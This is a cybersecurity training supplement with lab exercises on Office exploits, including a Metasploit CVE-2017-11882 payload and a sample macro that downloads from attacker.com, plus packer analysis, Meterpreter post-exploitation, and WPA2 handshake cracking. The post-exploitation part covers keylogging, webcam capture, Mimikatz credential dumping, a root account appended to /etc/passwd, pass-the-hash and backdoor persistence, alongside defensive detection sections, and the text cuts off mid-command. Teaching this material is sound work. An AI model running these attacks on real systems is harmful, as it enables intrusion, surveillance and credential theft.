# Cybersecurity Advanced Modules

### Supplement to Main Study Guide

> **Lab Requirement:** All exercises require your own VMs (Kali Linux, Metasploitable2, Windows VM). Never test on systems you do not own or have written permission to test.

---

## Table of Contents

- [Module A: Document-Based Exploitation & Silent Exploits](#module-a-document-based-exploitation--silent-exploits)
- [Module B: Crypters, Packers & Malware Reverse Engineering](#module-b-crypters-packers--malware-reverse-engineering)
- [Module C: Advanced Metasploit Post-Exploitation](#module-c-advanced-metasploit-post-exploitation)
- [Module D: Wi-Fi Security Testing (Your Own Network)](#module-d-wi-fi-security-testing-your-own-network)
- [Module E: Reverse Engineering with Ghidra](#module-e-reverse-engineering-with-ghidra)

---

## Module A: Document-Based Exploitation & Silent Exploits

### A.1 What Are Document-Based Exploits?

Document-based exploits abuse vulnerabilities in software that _opens_ documents — Microsoft Office, Adobe Reader, LibreOffice — rather than targeting the OS directly. When a user opens a malicious `.docx`, `.pdf`, or `.xls`, the vulnerability in the opener executes attacker code.

This is significant from a security perspective because:

- Documents are universally trusted by users
- Email filters often allow document attachments
- Defenders must patch document-processing software, not just the OS

```
Attack Chain:
Malicious .docx → Microsoft Word opens it → Vulnerability triggers
→ Shellcode executes → Reverse shell / Meterpreter session
```

### A.2 CVE Research — Understanding Vulnerability Databases

Every publicly known vulnerability gets a CVE (Common Vulnerabilities and Exposures) number. Learning to research CVEs is a core defensive skill — you need to know what's vulnerable before attackers do.

**Primary CVE Sources:**

```
National Vulnerability Database (NVD):  https://nvd.nist.gov/
MITRE CVE List:                         https://cve.mitre.org/
Exploit Database:                       https://www.exploit-db.com/
Rapid7 Vulnerability DB:               https://www.rapid7.com/db/
Vulhub (Docker lab environments):       https://github.com/vulhub/vulhub
```

**CVE Anatomy:**

```
CVE-2017-11882 (famous Office vulnerability)

CVE-YEAR-NUMBER
│    │     └── Sequential ID
│    └── Year discovered/published
└── Common Vulnerabilities and Exposures

NVD entry contains:
- CVSS Score (0-10 severity)
- Description
- Affected versions
- References
- Known exploits (CWE type)
```

**CVSS Scoring System:**

```
Score Range    Severity
0.0            None
0.1 – 3.9      Low
4.0 – 6.9      Medium
7.0 – 8.9      High
9.0 – 10.0     Critical

CVE-2017-11882: CVSS 7.8 (High)
CVE-2021-44228 (Log4Shell): CVSS 10.0 (Critical)
```

**Practical CVE Research Exercise:**

```bash
# Search Exploit-DB from Kali:
searchsploit microsoft office
searchsploit "CVE-2017-11882"
searchsploit adobe reader

# Copy exploit to working directory:
searchsploit -m 43992  # Copy by EDB-ID number

# Search NVD via CLI tool:
pip3 install nvdlib
python3 -c "
import nvdlib
results = nvdlib.searchCVE(keywordSearch='Microsoft Office 2017', limit=5)
for r in results:
    print(r.id, r.score, r.descriptions[0].value[:100])
"
```

### A.3 Microsoft Office Macro-Based Attacks — How They Work

Office macros are VBA (Visual Basic for Applications) scripts embedded in documents. Historically, macros were a primary malware delivery mechanism.

**How macro attacks work:**

```
1. Attacker creates .docm / .xlsm with malicious VBA macro
2. Document sent to victim
3. Victim opens document
4. Office shows "Enable Macros" prompt
5. If victim enables → macro executes
6. Macro downloads/runs payload or directly spawns shell
```

**Analyzing a malicious macro (defensive skill):**

```vba
' Example of suspicious macro patterns defenders look for:

' Pattern 1: Shell execution
Sub AutoOpen()                        ' Runs automatically on open
    Shell "powershell.exe -enc <base64>"
End Sub

' Pattern 2: Download and execute
Sub Document_Open()
    Dim req As Object
    Set req = CreateObject("MSXML2.XMLHTTP")
    req.Open "GET", "http://attacker.com/payload.exe", False
    req.Send
    ' Write to disk and execute...
End Sub

' Pattern 3: WScript shell
Sub AutoOpen()
    CreateObject("WScript.Shell").Run "cmd.exe /c whoami"
End Sub
```

**Lab Exercise — Create and analyze a test macro (your own VM only):**

On your Windows VM, create a macro that just opens Calculator (harmless demo):

```vba
' Open Word → Developer tab → Macros → Create new
' Name: TestMacro

Sub TestMacro()
    ' This just opens calculator — safe demo
    Shell "calc.exe"
    MsgBox "Macro executed! In a real attack, this would be a payload."
End Sub
```

**Analyzing macros with olevba:**

```bash
# Install on Kali:
pip3 install oletools

# Analyze a document's macros:
olevba suspicious_document.docm

# Output shows:
# - All VBA code
# - Suspicious patterns (Shell, CreateObject, AutoOpen)
# - IOCs (URLs, IPs, file paths in the macro)
# - Risk level

# Full document analysis:
mraptor suspicious_document.docm    # Quick malicious macro detector
oledump.py suspicious_document.docm # Dump all OLE streams
```

**Scanning documents in bulk:**

```bash
# Scan a folder of documents:
for f in /path/to/docs/*.doc*; do
    echo "=== $f ==="
    mraptor "$f" 2>/dev/null
done

# Find all documents with macros:
find /path -name "*.doc*" -o -name "*.xls*" -o -name "*.ppt*" | \
  xargs -I{} sh -c 'olevba "{}" 2>/dev/null | grep -l "AutoOpen\|Document_Open\|Shell"'
```

### A.4 CVE-2017-11882 — Famous Office Equation Editor Exploit

This vulnerability is one of the most exploited in history. The Equation Editor component in Office had a stack buffer overflow that required NO macro enabling — opening the document was enough.

**Understanding it (defensive knowledge):**

```
Affected: Microsoft Office 2007-2016
Component: EQNEDT32.EXE (Equation Editor)
Type: Stack buffer overflow
CVSS: 7.8
Fixed: November 2017 Patch Tuesday

Why it was dangerous:
- No macro prompt
- Works even with macros disabled
- Equation Editor runs as a separate process
- Very old, unpatched code in the component
```

**Lab Exercise — Test CVE-2017-11882 in controlled environment:**

This requires an **unpatched** Office 2016 VM. Use a snapshot of your Windows VM before applying updates.

```bash
# On Kali — generate malicious RTF (for your own unpatched VM only):
msfconsole

use exploit/windows/fileformat/office_ms17_11882
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.56.101   # Your Kali IP
set LPORT 4444
set FILENAME test_equation.doc
run
# File saved to /root/.msf4/local/test_equation.doc

# Set up listener:
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.56.101
set LPORT 4444
run

# Transfer test_equation.doc to your Windows VM
# Open it — session opens in Metasploit
```

**Defense against CVE-2017-11882:**

```
1. PATCH: Install KB4011604 (November 2017)
2. DISABLE Equation Editor:
   reg delete "HKLM\SOFTWARE\Microsoft\Office\Common\COM Compatibility\{0002CE02-0000-0000-C000-000000000046}" /f

3. DCOM hardening:
   Disable EQNEDT32.EXE in DCOM configuration

4. Attack Surface Reduction (ASR) rules via Group Policy:
   Block Office applications from creating child processes
   Block Office applications from creating executable content
```

### A.5 PDF Exploitation — How It Works

PDF files support JavaScript, forms, and embedded objects — all potential attack surfaces.

**Common PDF exploit types:**

```
1. JavaScript exploits — abuse PDF JS engine (Adobe Reader vulnerabilities)
2. Action-based — /Launch action to run system commands (older readers)
3. Embedded files — hidden executables extracted on open
4. Form data theft — forms submit data to attacker server
```

**Analyzing suspicious PDFs:**

```bash
# Install PDF analysis tools:
pip3 install pdfid pdf-parser

# Quick risk assessment:
pdfid suspicious.pdf
# Look for: /JS, /JavaScript, /AA, /OpenAction, /Launch, /EmbeddedFile

# Detailed analysis:
pdf-parser suspicious.pdf
pdf-parser --search JavaScript suspicious.pdf
pdf-parser --object 5 suspicious.pdf  # Analyze specific object

# Extract embedded objects:
pdf-parser --filter --raw --object 5 suspicious.pdf > embedded_object

# Full analysis with peepdf:
pip3 install peepdf
peepdf suspicious.pdf
# Interactive shell for deep analysis
```

**Lab Exercise — Create a test PDF that captures form input:**

On your own server, create a PDF form that submits to your own endpoint:

```python
# Create test PDF with form (using reportlab):
pip3 install reportlab

from reportlab.pdfgen import canvas
from reportlab.lib.pagesizes import letter

def create_test_form():
    c = canvas.Canvas("test_form.pdf", pagesize=letter)
    c.drawString(100, 700, "Security Test Form")
    c.drawString(100, 650, "This PDF submits data to our test server")

    # Add form field (AcroForm)
    from reportlab.pdfbase import pdfform
    # Form fields would be added here in production

    c.save()

create_test_form()
```

### A.6 Defensive — Document Security Policy

```
TECHNICAL CONTROLS:
1. Patch Management
   - Office patches applied within 72 hours of release
   - Track CVEs affecting your Office version via NVD
   - Subscribe to Microsoft Security Response Center alerts

2. Group Policy (Windows Domain):
   - Disable macros by default (User Configuration → Admin Templates → Office)
   - Enable macro signing requirement (only signed macros run)
   - Block external content (linked images, data connections)
   - Enable Protected View for internet/email files

3. Attack Surface Reduction Rules (Defender ATP):
   # PowerShell — enable ASR rules:
   Set-MpPreference -AttackSurfaceReductionRules_Ids \
     D4F940AB-401B-4EFC-AADC-AD5F3C50688A `  # Block Office child processes
     3B576869-A4EC-4529-8536-B80A7769E899 `  # Block Office executable content
     75668C1F-73B5-4CF0-BB93-3ECF5CB7CC84 `  # Block Office injecting into processes
     -AttackSurfaceReductionRules_Actions Enabled,Enabled,Enabled

4. Email Gateway:
   - Strip macros from incoming documents (tools: oletools integration)
   - Block .docm, .xlsm, .pptm by default
   - Sandbox attachments before delivery

5. Sandboxing:
   - Open all email attachments in isolated environment
   - Tools: Cuckoo Sandbox, Any.run integration
```

---

## Module B: Crypters, Packers & Malware Reverse Engineering

### B.1 What Are Packers and Crypters?

**Packer:** Compresses an executable. The packed file decompresses itself at runtime. Primary purpose: reduce file size. Side effect: changes hash, may evade AV.

**Crypter:** Encrypts an executable's payload. A stub decrypts and loads it at runtime. Primary purpose: AV evasion.

```
ORIGINAL PAYLOAD → CRYPTER/PACKER → PROTECTED BINARY

Protected Binary structure:
┌─────────────────────────────────┐
│  STUB (decryption/unpack code)  │ ← Runs first
├─────────────────────────────────┤
│  ENCRYPTED/PACKED PAYLOAD       │ ← Decrypted at runtime
└─────────────────────────────────┘

At runtime:
1. Stub executes
2. Stub decrypts/decompresses payload in memory
3. Payload executes (never touches disk in its original form)
```

### B.2 Common Packing Methods

| Method          | Tool         | Detection                 | Notes                   |
| --------------- | ------------ | ------------------------- | ----------------------- |
| UPX             | UPX packer   | Easy (UPX header visible) | Legitimate, widely used |
| MPRESS          | MPRESS       | Medium                    | Common in malware       |
| Themida         | Commercial   | Hard                      | Heavy obfuscation       |
| Custom          | Various      | Variable                  | Most sophisticated      |
| Base64 encoding | Scripts      | Easy                      | PowerShell malware      |
| XOR encryption  | Custom stubs | Medium                    | Simple but effective    |

### B.3 Detecting Packed Executables — Entropy Analysis

Packed/encrypted files have high entropy (randomness). Normal code has lower entropy.

```python
# entropy_analyzer.py — analyze PE file sections
import math
import pefile
from collections import Counter

def calculate_entropy(data):
    if not data:
        return 0
    counter = Counter(data)
    length = len(data)
    return -sum((c/length) * math.log2(c/length) for c in counter.values())

def analyze_pe(filepath):
    try:
        pe = pefile.PE(filepath)
        print(f"\nAnalyzing: {filepath}")
        print(f"{'Section':<10} {'Size':>10} {'Entropy':>10} {'Suspicious?':>12}")
        print("-" * 45)

        for section in pe.sections:
            name = section.Name.decode().rstrip('\x00')
            data = section.get_data()
            entropy = calculate_entropy(data)
            suspicious = "YES ⚠" if entropy > 7.0 else "No"
            print(f"{name:<10} {len(data):>10} {entropy:>10.4f} {suspicious:>12}")

        # Overall file entropy
        with open(filepath, 'rb') as f:
            file_data = f.read()
        overall = calculate_entropy(file_data)
        print(f"\nOverall entropy: {overall:.4f}")

        if overall > 7.0:
            print("⚠  HIGH ENTROPY — likely packed/encrypted")
        elif overall > 6.0:
            print("⚡ MEDIUM-HIGH entropy — possibly packed")
        else:
            print("✓  Normal entropy")

    except Exception as e:
        print(f"Error: {e}")

# Usage:
# pip3 install pefile
# python3 entropy_analyzer.py suspicious.exe
if __name__ == "__main__":
    import sys
    analyze_pe(sys.argv[1])
```

```bash
# Quick entropy check with binwalk:
sudo apt install binwalk
binwalk --entropy suspicious.exe
# Plots entropy graph — spikes = packed sections

# DIE (Detect It Easy) — identify packers:
# Download: https://github.com/horsicq/Detect-It-Easy
# Or on Kali:
sudo apt install detect-it-easy
diec suspicious.exe
```

### B.4 Unpacking UPX (Lab Exercise)

UPX is the simplest packer to learn on — it's legitimate software used in many programs.

```bash
# Install UPX:
sudo apt install upx

# Pack a test binary (use any ELF binary):
cp /usr/bin/ls /tmp/test_binary
upx /tmp/test_binary -o /tmp/test_packed

# Compare:
ls -la /tmp/test_binary /tmp/test_packed
file /tmp/test_packed  # Shows "packed with UPX"

# Check entropy:
python3 entropy_analyzer.py /tmp/test_binary   # ~4-6
python3 entropy_analyzer.py /tmp/test_packed   # ~7-8

# Unpack:
upx -d /tmp/test_packed -o /tmp/test_unpacked

# Verify they match:
md5sum /tmp/test_binary /tmp/test_unpacked
# Hashes should be identical
```

### B.5 Static Analysis of Packed Malware

When you encounter a packed sample (from malware repositories like MalwareBazaar — for research only in isolated VM):

```bash
# Step 1: Initial triage
file suspicious.exe
strings suspicious.exe | head -50
strings suspicious.exe | grep -E "http|\.exe|cmd|powershell|HKEY"

# Step 2: Identify packer
diec suspicious.exe
# or
PEiD  # Windows tool

# Step 3: Check imports (packed files have minimal imports)
rabin2 -i suspicious.exe  # Radare2 tool

# Step 4: Check sections
rabin2 -S suspicious.exe
# Packed: few sections, high entropy, small .text, large unknown section

# Step 5: PE header analysis
pestudio suspicious.exe  # GUI tool
# or
python3 -c "
import pefile
pe = pefile.PE('suspicious.exe')
print('Entry Point:', hex(pe.OPTIONAL_HEADER.AddressOfEntryPoint))
print('Sections:', [s.Name.decode().rstrip(chr(0)) for s in pe.sections])
print('Imports:', [e.dll.decode() for e in pe.DIRECTORY_ENTRY_IMPORT] if hasattr(pe, 'DIRECTORY_ENTRY_IMPORT') else 'None')
"
```

### B.6 Dynamic Analysis — Run and Watch

The most reliable way to analyze packed malware is running it in a sandbox and observing behavior.

```bash
# Set up Cuckoo Sandbox (your own isolated environment):
# https://cuckoosandbox.org/

# Quick setup with Docker:
git clone https://github.com/cuckoosandbox/cuckoo
cd cuckoo
pip3 install -U cuckoo

# Or use ANY.RUN web sandbox for samples:
# https://app.any.run/

# Process Monitor (Windows VM — from Sysinternals):
# Run Process Monitor BEFORE running suspicious file
# Filter by: Process Name → suspicious.exe
# Watch: Registry, File, Network, Process activity
```

**What to document during dynamic analysis:**

```
PROCESS ACTIVITY:
□ Child processes spawned
□ Process injection attempts
□ Privilege escalation attempts

FILE SYSTEM:
□ Files created (especially in %TEMP%, %APPDATA%)
□ Files deleted (original file self-deletion)
□ Files modified

REGISTRY:
□ Run key modifications (persistence)
□ Service installations
□ COM object registration

NETWORK:
□ DNS queries (C2 domain lookups)
□ HTTP/S connections (C2 communication)
□ Unusual ports used
```

### B.7 Encoding, Encryption & Compression — Technical Detail

Understanding these helps you analyze obfuscated malware:

**Base64 Encoding:**

```python
import base64

# Encode:
payload = b"whoami"
encoded = base64.b64encode(payload)
print(encoded)  # b'd2hvYW1p'

# Decode:
decoded = base64.b64decode(encoded)
print(decoded)  # b'whoami'

# PowerShell encoded command format:
import subprocess
cmd = "whoami"
encoded_cmd = base64.b64encode(cmd.encode('utf-16-le')).decode()
print(f"powershell -enc {encoded_cmd}")

# Decode a PowerShell encoded command:
encoded = "dwBoAG8AYQBtAGkA"
decoded = base64.b64decode(encoded).decode('utf-16-le')
print(decoded)  # whoami
```

**XOR Encryption (common in simple malware):**

```python
def xor_encrypt_decrypt(data, key):
    """XOR is symmetric — same function encrypts and decrypts"""
    if isinstance(data, str):
        data = data.encode()
    if isinstance(key, str):
        key = key.encode()

    result = bytes([
        data[i] ^ key[i % len(key)]
        for i in range(len(data))
    ])
    return result

# Example:
payload = b"calc.exe"
key = b"secretkey"

encrypted = xor_encrypt_decrypt(payload, key)
print(f"Encrypted: {encrypted.hex()}")

decrypted = xor_encrypt_decrypt(encrypted, key)
print(f"Decrypted: {decrypted}")

# Finding XOR key when you have plaintext and ciphertext:
# If you know plaintext starts with "MZ" (PE header):
known_plain = b"MZ"
first_bytes_cipher = encrypted[:2]
key_bytes = bytes([known_plain[i] ^ first_bytes_cipher[i] for i in range(2)])
print(f"Key starts with: {key_bytes.hex()}")
```

**AES Encryption (modern malware):**

```python
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import os

def aes_encrypt(data, key):
    """AES-256-CBC encryption"""
    if isinstance(data, str):
        data = data.encode()
    iv = os.urandom(16)  # Random IV
    cipher = AES.new(key, AES.MODE_CBC, iv)
    encrypted = cipher.encrypt(pad(data, AES.block_size))
    return iv + encrypted  # Prepend IV for decryption

def aes_decrypt(data, key):
    """AES-256-CBC decryption"""
    iv = data[:16]
    ciphertext = data[16:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(ciphertext), AES.block_size)

# Usage:
key = os.urandom(32)  # 256-bit key
data = b"This is the payload"
encrypted = aes_encrypt(data, key)
decrypted = aes_decrypt(encrypted, key)
print(decrypted)  # b'This is the payload'
```

### B.8 Defensive — Anti-Packing Detection in Your Pipeline

```python
# scan_for_packed.py — integrate into CI/CD or file upload scanning
import pefile
import math
from collections import Counter
import sys

def get_entropy(data):
    if not data:
        return 0
    c = Counter(data)
    l = len(data)
    return -sum((v/l)*math.log2(v/l) for v in c.values())

def check_packed(filepath):
    try:
        pe = pefile.PE(filepath)

        warnings = []

        # Check section entropy
        for section in pe.sections:
            e = get_entropy(section.get_data())
            if e > 7.2:
                warnings.append(f"High entropy section: {section.Name.decode().rstrip(chr(0))} ({e:.2f})")

        # Check for minimal imports (packed files)
        if hasattr(pe, 'DIRECTORY_ENTRY_IMPORT'):
            import_count = len(pe.DIRECTORY_ENTRY_IMPORT)
            if import_count < 3:
                warnings.append(f"Very few imports: {import_count} DLLs")
        else:
            warnings.append("No imports — almost certainly packed")

        # Check for known packer signatures
        with open(filepath, 'rb') as f:
            raw = f.read(512)

        if b'UPX0' in raw or b'UPX1' in raw:
            warnings.append("UPX packer signature found")

        return warnings

    except Exception as e:
        return [f"Analysis error: {e}"]

if __name__ == "__main__":
    filepath = sys.argv[1]
    warnings = check_packed(filepath)
    if warnings:
        print(f"⚠  SUSPICIOUS: {filepath}")
        for w in warnings:
            print(f"   - {w}")
    else:
        print(f"✓  OK: {filepath}")
```

---

## Module C: Advanced Metasploit Post-Exploitation

### C.1 Post-Exploitation Phases

```
INITIAL ACCESS → POST-EXPLOITATION PHASES:
│
├── 1. SITUATIONAL AWARENESS
│   └── Who am I? Where am I? What's on this network?
│
├── 2. PRIVILEGE ESCALATION
│   └── Get from user → Administrator/root
│
├── 3. CREDENTIAL HARVESTING
│   └── Dump hashes, find plaintext passwords
│
├── 4. LATERAL MOVEMENT
│   └── Move to other systems on the network
│
├── 5. PERSISTENCE
│   └── Ensure access survives reboots
│
└── 6. EXFILTRATION (in real attacks — data theft)
    └── Identify and extract valuable data
```

### C.2 Meterpreter — Complete Command Reference

```bash
# After getting a Meterpreter session:

# ── CORE COMMANDS ──────────────────────────────────
background          # Background current session
sessions -l         # List all sessions
sessions -i 1       # Interact with session 1
sessions -k 1       # Kill session 1
exit                # Exit Meterpreter

# ── SYSTEM INFORMATION ─────────────────────────────
sysinfo             # OS, hostname, architecture
getuid              # Current user
getpid              # Current process ID
ps                  # List all running processes
pwd                 # Current directory
ls                  # List directory
cd /path            # Change directory
env                 # Environment variables

# ── FILE OPERATIONS ────────────────────────────────
download /etc/passwd /tmp/       # Download file
upload /local/file.txt /remote/  # Upload file
cat /etc/passwd                  # Read file
edit /tmp/test.txt               # Edit file
mkdir /tmp/newdir                # Make directory
rm /tmp/file.txt                 # Delete file
search -f *.txt -d /home         # Search for files

# ── PROCESS MANAGEMENT ─────────────────────────────
migrate <PID>       # Migrate to another process
execute -f cmd.exe  # Execute a program
kill <PID>          # Kill a process

# ── NETWORK ────────────────────────────────────────
ifconfig            # Network interfaces
arp                 # ARP table
route               # Routing table
netstat             # Network connections
portfwd add -l 8080 -r 192.168.1.10 -p 80  # Port forward

# ── SHELL ACCESS ───────────────────────────────────
shell               # Drop to system shell
# (Ctrl+Z to background, then 'sessions -i 1' to return)

# ── CAPTURE ────────────────────────────────────────
screenshot          # Take screenshot
screen_stream       # Live screen stream
keyscan_start       # Start keylogger
keyscan_dump        # Dump keystrokes
keyscan_stop        # Stop keylogger
webcam_list         # List webcams
webcam_snap         # Take webcam photo
record_mic -d 10    # Record microphone (10 seconds)

# ── PRIVILEGE ──────────────────────────────────────
getsystem           # Attempt privilege escalation
getprivs            # Show current privileges
```

### C.3 Privilege Escalation on Linux (Metasploitable2 Lab)

```bash
# After getting a low-priv shell on Metasploitable2:

# ── AUTOMATED SCANNING ─────────────────────────────
# Upload LinPEAS (Linux Privilege Escalation Awesome Script):
# Download: https://github.com/carlospolop/PEASS-ng

# In Meterpreter:
upload /local/linpeas.sh /tmp/
shell
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh 2>/dev/null | tee /tmp/linpeas_output.txt

# ── MANUAL CHECKS ──────────────────────────────────
# SUID binaries (run as owner, not executor):
find / -perm -u=s -type f 2>/dev/null

# Writable /etc/passwd (rare but devastating):
ls -la /etc/passwd
# If writable: echo "hacker::0:0::/root:/bin/bash" >> /etc/passwd

# Sudo rights:
sudo -l

# Cron jobs running as root:
cat /etc/crontab
ls -la /etc/cron.*

# Writable cron scripts:
ls -la $(cat /etc/crontab | awk '{print $7}' | grep '/')

# Kernel exploits:
uname -a  # Get kernel version
# Search: searchsploit linux kernel 2.6.32  (Metasploitable2 kernel)

# PATH hijacking:
echo $PATH
# If . (current dir) in PATH, and root runs script that calls program without full path
```

**Lab Exercise — SUID Exploitation on Metasploitable2:**

```bash
# Find SUID binaries:
find / -perm -u=s -type f 2>/dev/null

# Common exploitable SUID on Metasploitable2:
# /usr/bin/nmap (old versions had --interactive)
/usr/bin/nmap --interactive
nmap> !sh     # Drop to root shell!

# /usr/bin/find with exec:
find . -exec /bin/sh -p \; -quit

# /bin/bash with SUID:
/bin/bash -p   # -p preserves effective UID
```

### C.4 Privilege Escalation on Windows (Your Windows VM Lab)

```bash
# Upload WinPEAS:
# Download: https://github.com/carlospolop/PEASS-ng/releases

# In Meterpreter:
upload winpeas.exe C:\\Windows\\Temp\\
shell
C:\Windows\Temp\winpeas.exe

# ── MANUAL CHECKS ──────────────────────────────────
# In Windows shell:

# System info:
systeminfo
wmic os get caption,version,buildnumber

# Current user and privileges:
whoami /priv
whoami /groups

# Unquoted service paths (classic privesc):
wmic service get name,displayname,pathname,startmode | \
  findstr /i "auto" | findstr /i /v "c:\windows"

# AlwaysInstallElevated (MSI installs as SYSTEM):
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Writable service binaries:
# Find services running as SYSTEM with writable binary paths

# Stored credentials:
cmdkey /list
# Check for saved RDP credentials

# Scheduled tasks:
schtasks /query /fo LIST /v | findstr "Run As User\|Task To Run"
```

**Metasploit Local Exploit Suggester:**

```bash
# After getting initial shell, find privesc paths automatically:
background  # Background your session

use post/multi/recon/local_exploit_suggester
set SESSION 1
run
# Lists all local exploits that may work on this target

# Try a suggested exploit:
use exploit/windows/local/bypassuac_fodhelper
set SESSION 1
set LHOST 192.168.56.101
set LPORT 5555
run
```

### C.5 Credential Harvesting

```bash
# ── LINUX ──────────────────────────────────────────
# Password hashes:
cat /etc/shadow  # Requires root

# In Meterpreter (root):
run post/linux/gather/hashdump
# Output: username:hash format

# Crack hashes with John:
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt

# Crack with Hashcat (GPU — faster):
hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt
# -m 1800 = sha512crypt (Linux default)

# ── WINDOWS ────────────────────────────────────────
# SAM database hashes (requires SYSTEM):
run post/windows/gather/hashdump
# or:
use post/windows/gather/smart_hashdump
set SESSION 1
run

# Crack NTLM hashes:
hashcat -m 1000 ntlm_hashes.txt rockyou.txt

# Mimikatz (dump plaintext passwords from memory):
# Requires SYSTEM + SeDebugPrivilege
load kiwi  # Meterpreter Mimikatz module
creds_all              # Dump all credentials
lsa_dump_sam           # Dump SAM
lsa_dump_secrets       # Dump LSA secrets
wifi_list              # WiFi passwords!

# Browser saved credentials:
run post/windows/gather/credentials/credential_collector
run post/multi/gather/firefox_creds
run post/multi/gather/chrome_cookies
```

### C.6 Lateral Movement

```bash
# After getting credentials — move to other machines:

# Pass-the-Hash (NTLM hash, no plaintext needed):
use exploit/windows/smb/psexec
set RHOSTS 192.168.56.103    # Another machine on your lab network
set SMBUser Administrator
set SMBPass aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
run

# Pivot through compromised host:
# Route traffic through session 1 to reach internal network:
route add 10.10.10.0/24 1  # Session 1 as pivot
route print

# SOCKS proxy through Meterpreter:
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 5
run
# Now configure proxychains to use 127.0.0.1:1080
proxychains nmap -sT -p 80,445,22 10.10.10.0/24

# Port forwarding:
portfwd add -l 3389 -r 10.10.10.5 -p 3389  # Forward RDP through pivot
rdesktop 127.0.0.1:3389  # Connect to internal RDP
```

### C.7 Persistence Mechanisms

```bash
# ── LINUX PERSISTENCE ──────────────────────────────
# Cron job:
run post/linux/manage/cron_persistence
# Or manually:
echo "*/5 * * * * /tmp/.backdoor" >> /etc/crontab

# SSH authorized key:
mkdir -p /root/.ssh
echo "ssh-rsa YOUR_PUBLIC_KEY" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# Systemd service (as root):
cat > /etc/systemd/system/update.service << EOF
[Unit]
Description=System Update

[Service]
ExecStart=/tmp/.backdoor
Restart=always

[Install]
WantedBy=multi-user.target
EOF
systemctl enable update.service

# ── WINDOWS PERSISTENCE ────────────────────────────
# Registry Run key:
run post/windows/manage/persistence_exe
# Or manually:
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" \
  /v "WindowsUpdate" /t REG_SZ /d "C:\Windows\Temp\update.exe"

# Scheduled task:
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\update.exe" \
  /sc onlogon /ru SYSTEM

# Service:
sc create "WindowsUpdate" binPath= "C:\Windows\Temp\update.exe" start= auto
sc start "WindowsUpdate"
```

### C.8 Defensive — Detecting and Preventing Post-Exploitation

```bash
# ── DETECT LATERAL MOVEMENT ────────────────────────
# Windows — detect pass-the-hash:
# Event ID 4624 with LogonType 3 (network) and NtLmSsp auth
Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4624} |
  Where-Object {$_.Message -match "NtLmSsp" -and $_.Message -match "LogonType.*3"}

# Detect Mimikatz:
# Event ID 4656 (handle to LSASS requested)
# Event ID 10 in Sysmon (process access to lsass.exe)

# Detect persistence:
# Monitor: HKLM\Software\Microsoft\Windows\CurrentVersion\Run
# Monitor: Scheduled task creation (Event ID 4698)
# Monitor: Service installation (Event ID 7045)

# ── PREVENT LATERAL MOVEMENT ───────────────────────
# Network segmentation:
# Separate VLANs for different security zones
# Firewall rules blocking unnecessary SMB/RDP between workstations

# Credential protection:
# Enable Credential Guard (Windows 10+):
# Isolates LSASS in virtualized environment — Mimikatz can't read it

# Local admin password randomization:
# LAPS (Local Administrator Password Solution) — different password per machine
# Prevents pass-the-hash across all machines with same local admin password

# Privileged Access Workstations (PAW):
# Separate hardened machines for admin tasks
# No email/browsing on admin machines
```

---

## Module D: Wi-Fi Security Testing (Your Own Network)

> **Legal Requirement:** Only test Wi-Fi networks you own or have explicit written permission to test. Testing neighbor networks without permission is illegal in every country.

### D.1 Wi-Fi Security Protocols

| Protocol        | Year | Security                        | Status                |
| --------------- | ---- | ------------------------------- | --------------------- |
| WEP             | 1997 | Broken (crack in minutes)       | Never use             |
| WPA             | 2003 | Weak (TKIP flaws)               | Deprecated            |
| WPA2-Personal   | 2004 | Good but PMKID/handshake attack | Still common          |
| WPA2-Enterprise | 2004 | Strong (per-user auth)          | Recommended corporate |
| WPA3            | 2018 | Strong (SAE handshake)          | Recommended           |

### D.2 Wi-Fi Hardware for Your Lab

You need a wireless adapter that supports **monitor mode** and **packet injection**:

```
Recommended adapters (confirmed working with Kali):
- Alfa AWUS036ACH (USB, 802.11ac, dual-band)
- Alfa AWUS036NHA (USB, 802.11n, 2.4GHz, great range)
- TP-Link TL-WN722N v1 (cheap, widely used — must be v1)

Check your adapter:
iw list | grep "Supported interface modes" -A 10
# Must show: monitor
```

### D.3 Setting Up Monitor Mode

```bash
# Check available wireless interfaces:
iwconfig
ip link show

# Method 1 — airmon-ng:
sudo airmon-ng check kill    # Kill conflicting processes
sudo airmon-ng start wlan0   # Enable monitor mode
# Creates: wlan0mon

# Method 2 — manual:
sudo ip link set wlan0 down
sudo iw wlan0 set monitor control
sudo ip link set wlan0 up
iwconfig wlan0  # Verify Mode: Monitor

# Verify monitor mode:
sudo airodump-ng wlan0mon
# Should show nearby access points
```

### D.4 WPA2 Handshake Capture

WPA2-Personal uses a 4-way handshake for authentication. The handshake contains enough information to attempt offline dictionary attacks.

```bash
# Step 1: Scan for nearby networks (YOUR OWN NETWORK only):
sudo airodump-ng wlan0mon
# Note your target:
# BSSID: AA:BB:CC:DD:EE:FF
# Channel: 6
# ESSID: YourHomeNetwork

# Step 2: Capture handshake from your own AP:
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon

# Step 3: Force handshake by deauthenticating a device from YOUR network:
# (Open new terminal)
sudo aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon
# -0 5 = send 5 deauth packets
# -a = AP BSSID (your router)
# -c = client MAC (your phone/laptop)

# Step 4: Watch airodump-ng — when it shows:
# "WPA handshake: AA:BB:CC:DD:EE:FF" → success!
# Stop capture (Ctrl+C)

# Files created: capture-01.cap
```

### D.5 Cracking WPA2 (Your Own Network — Testing Password Strength)

```bash
# Method 1: Aircrack-ng with wordlist
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

# Method 2: Hashcat (GPU — much faster)
# Convert capture to hashcat format:
hcxpcapngtool -o hash.hc22000 capture-01.cap
# or:
